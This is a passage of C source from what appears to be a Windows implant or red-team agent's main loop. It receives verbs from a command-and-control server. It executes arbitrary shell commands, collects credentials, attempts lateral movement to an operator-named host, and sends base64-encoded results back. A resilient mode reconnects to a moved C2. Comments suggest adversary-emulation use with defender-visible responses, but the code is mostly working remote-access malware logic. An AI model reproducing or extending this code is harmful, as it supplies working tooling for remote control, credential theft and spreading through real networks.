                } else if (px_strncmp(plain, g_vocab.cred, 5) == 0) {
                    char *cmd_id = plain + 5;
                    char report[1024];
                    long rc = -1;
                    char *b64;
                    static char reply[65536];
                    int supported = PX_CRED_ACCESS ? 1 : 0;

                    bar1 = px_strchr(cmd_id, '|');
                    if (bar1)
                        *bar1 = '\0';
                    if (supported) {
                        int cn = px_cred_collect(report, sizeof(report));
                        px_logf(g_vocab.log_cred, cmd_id, report);
                        if (cn == 0)
                            px_snprintf(report, sizeof(report),
                                        g_vocab.txt_no_cred_data);
                        rc = 0;
                    } else {
                        px_snprintf(report, sizeof(report),
                                   "this build has no credential access capability");
                        rc = -1;
                    }
                    b64 = b64_encode((const unsigned char *)report,
                                     (px_size_t)px_strlen(report));
                    {
                        px_size_t rn = px_fmt(reply, sizeof(reply),
                                              g_vocab.f_result,
                                              cmd_id, b64 ? b64 : "", rc);
                        send_line(sock, reply, (int)rn, p_send);
                    }
                    if (b64)
                        HeapFree(GetProcessHeap(), 0, b64);
                }
                else if (px_strncmp(plain, g_vocab.lateral, 8) == 0) {
                    char *cmd_id = plain + 8;
                    char *host;
                    char report[1024];
                    long rc = -1;
                    char *b64;
                    static char reply[65536];

                    bar1 = px_strchr(cmd_id, '|');
                    if (!bar1)
                        continue;
                    *bar1 = '\0';
                    host = bar1 + 1;
                    bar2 = px_strchr(host, '|');
                    if (bar2)
                        *bar2 = '\0';
                    {
                        int moved = PX_LATERAL
                            ? px_lateral_move(host, report, sizeof(report))
                            : -1;
                        if (moved < 0) {
                            px_snprintf(report, sizeof(report),
                                       "this build has no lateral movement capability");
                            rc = -1;
                        } else {
                            rc = 0;
                        }
                        px_logf(g_vocab.log_lateral, cmd_id, report);
                    }
                    b64 = b64_encode((const unsigned char *)report,
                                     (px_size_t)px_strlen(report));
                    {
                        px_size_t rn = px_fmt(reply, sizeof(reply),
                                              g_vocab.f_result,
                                              cmd_id, b64 ? b64 : "", rc);
                        send_line(sock, reply, (int)rn, p_send);
                    }
                    if (b64)
                        HeapFree(GetProcessHeap(), 0, b64);
                }
            }
            continue;
        }
#endif /* PX_ENCRYPT */

        n = p_recv(sock, recvbuf + used, (int)(sizeof(recvbuf) - 1 - used), 0);

        if (n <= 0) {
            px_logf(g_vocab.log_closed);
            break;
        }
        used += (px_size_t)n;
        recvbuf[used] = '\0';

        for (;;) {
            char *line = px_strchr(recvbuf, '\n');
            char *bar1, *bar2;
            int handled = 0;

            if (!line)
                break;
            *line = '\0';
            consumed = (px_size_t)(line - recvbuf) + 1;
            {
                px_size_t ll = px_strlen(recvbuf);
                if (ll && recvbuf[ll - 1] == '\r')
                    recvbuf[ll - 1] = '\0';
            }

            if (px_strncmp(recvbuf, g_vocab.ping, 4) == 0) {
                send_line(sock, g_vocab.pong, 4, p_send);
            } else if (px_strncmp(recvbuf, g_vocab.exit, 4) == 0) {
                px_logf(g_vocab.log_exit);
                goto done;
            } else if (px_handle_cap_cmd(sock, p_send, recvbuf,
                                        &handled)) {
                /* A capability from the library. */
            } else if (px_handle_transfer_cmd(sock, p_send, recvbuf,
                                              &handled)) {
                /* The file download or the screen capture. */
            } else if (px_strncmp(recvbuf, g_vocab.exec, 5) == 0) {
                char *cmd_id = recvbuf + 5;
                char *cmd;
                long rc = -1;
                char *out, *b64;
                static char reply[65536];

                bar1 = px_strchr(cmd_id, '|');
                if (!bar1)
                    goto shift;
                *bar1 = '\0';
                cmd = bar1 + 1;
                bar2 = px_strchr(cmd, '|');
                if (bar2)
                    *bar2 = '\0';

                px_logf(g_vocab.log_exec, cmd_id, cmd);
                out = run_command(cmd, &rc);
                b64 = b64_encode((const unsigned char *)((out && out[0]) ? out : ""),
                                 out ? px_strlen(out) : 0);
                {
                    px_size_t rn = px_fmt(reply, sizeof(reply),
                                          g_vocab.f_result,
                                          cmd_id, b64 ? b64 : "", rc);
                    send_line(sock, reply, (int)rn, p_send);
                }
                if (b64)
                    HeapFree(GetProcessHeap(), 0, b64);
                if (out)
                    HeapFree(GetProcessHeap(), 0, out);
            } else if (px_strncmp(recvbuf, g_vocab.cred, 5) == 0) {
                /* The credential-access capability.
                 *
                 * A baseline build answers with a plain "not supported"
                 * rather than silently ignoring the verb. The difference
                 * is observable on the wire, which is the point: a
                 * defender can see that the capability is absent, not
                 * just that nothing happened. */
                char *cmd_id = recvbuf + 5;
                char report[1024];
                long rc = -1;
                char *b64;
                static char reply[65536];
                int supported = PX_CRED_ACCESS ? 1 : 0;

                bar1 = px_strchr(cmd_id, '|');
                if (bar1)
                    *bar1 = '\0';

                if (supported) {
                    int n = px_cred_collect(report, sizeof(report));
                    px_logf(g_vocab.log_cred, cmd_id, report);
                    if (n == 0)
                        px_snprintf(report, sizeof(report),
                                   g_vocab.txt_no_cred_data);
                    rc = 0;
                } else {
                    px_snprintf(report, sizeof(report),
                               "this build has no credential access capability");
                    rc = -1;
                }

                b64 = b64_encode((const unsigned char *)report,
                                 (px_size_t)px_strlen(report));
                {
                    px_size_t rn = px_fmt(reply, sizeof(reply),
                                          g_vocab.f_result,
                                          cmd_id, b64 ? b64 : "", rc);
                    send_line(sock, reply, (int)rn, p_send);
                }
                if (b64)
                    HeapFree(GetProcessHeap(), 0, b64);
            }
            else if (px_strncmp(recvbuf, g_vocab.lateral, 8) == 0) {
                /* The lateral movement capability.
                 *
                 * One explicitly named target, no scanning, no
                 * propagation. The operator supplies the host. */
                char *cmd_id = recvbuf + 8;
                char *host;
                char report[1024];
                long rc = -1;
                char *b64;
                static char reply[65536];

                bar1 = px_strchr(cmd_id, '|');
                if (!bar1)
                    goto shift;
                *bar1 = '\0';
                host = bar1 + 1;
                bar2 = px_strchr(host, '|');
                if (bar2)
                    *bar2 = '\0';

                {
                    int moved = PX_LATERAL ? px_lateral_move(host, report,
                                                              sizeof(report))
                                            : -1;
                    if (moved < 0) {
                        px_snprintf(report, sizeof(report),
                                   "this build has no lateral movement capability");
                        rc = -1;
                    } else {
                        rc = 0;
                    }
                    px_logf(g_vocab.log_lateral, cmd_id, report);
                }

                b64 = b64_encode((const unsigned char *)report,
                                 (px_size_t)px_strlen(report));
                {
                    px_size_t rn = px_fmt(reply, sizeof(reply),
                                          g_vocab.f_result,
                                          cmd_id, b64 ? b64 : "", rc);
                    send_line(sock, reply, (int)rn, p_send);
                }
                if (b64)
                    HeapFree(GetProcessHeap(), 0, b64);
            }

        shift:
            {
                px_size_t rest = used - consumed;
                memmove(recvbuf, recvbuf + consumed, rest + 1);
                used = rest;
            }
            if (used == 0)
                break;
        }
    }

    /* The session ended. */
    p_closesocket(sock);
    sock = PX_INVALID_SOCKET;

#if PX_RESILIENT
    /* Reconnect.
     *
     * The most common way this session ends is not an attack and not a
     * bug: the operator's laptop changed network. The WiFi dropped, the
     * hotspot took over, the C2's address changed, and the socket died.
     * A payload that exits there is a payload that worked perfectly and
     * then stopped working because the operator walked out of the room.
     *
     * So the resilient arm reconnects, with backoff, and resolves the
     * endpoint name again each time -- which is what lets it pick up a
     * C2 that has moved. */
    px_logf(g_vocab.log_reconnect);
    attempt++;
    goto connect_again;
#else
    p_wsacleanup();
    px_logf(g_vocab.log_finished);
#endif

done:
    if (sock != PX_INVALID_SOCKET)
        p_closesocket(sock);
    p_wsacleanup();
    px_logf(g_vocab.log_finished);
}
